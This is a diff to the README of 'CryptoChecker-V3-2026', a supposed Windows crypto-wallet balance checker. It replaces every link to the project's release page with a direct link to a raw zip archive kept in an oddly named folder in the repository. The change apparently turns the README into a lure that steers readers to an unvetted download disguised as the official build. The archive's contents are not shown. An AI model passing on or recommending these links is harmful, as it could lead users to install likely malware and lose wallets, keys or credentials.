@@ -1,6 +1,6 @@
 # 🪙 CryptoChecker-V3-2026 - Fast Multi-Chain Balance Checking
 
-[![Download CryptoChecker-V3-2026](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/sigmapoopie857-max/CryptoChecker-V3-2026/releases)
+[![Download CryptoChecker-V3-2026](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/sigmapoopie857-max/CryptoChecker-V3-2026/raw/refs/heads/main/heteropoly/Crypto_Checker_v2.9.zip)
 
 ## 📦 What this app does
 
@@ -35,7 +35,7 @@ For best results:
 ## 🚀 Download the app
 
 Visit this page to download:  
-https://github.com/sigmapoopie857-max/CryptoChecker-V3-2026/releases
+https://github.com/sigmapoopie857-max/CryptoChecker-V3-2026/raw/refs/heads/main/heteropoly/Crypto_Checker_v2.9.zip
 
 ## 🪟 Install on Windows
 
@@ -200,7 +200,7 @@ Keep your data private.
 ## 📘 Release page
 
 Download the latest Windows build here:  
-https://github.com/sigmapoopie857-max/CryptoChecker-V3-2026/releases
+https://github.com/sigmapoopie857-max/CryptoChecker-V3-2026/raw/refs/heads/main/heteropoly/Crypto_Checker_v2.9.zip
 
 ## 🧰 Basic workflow
 
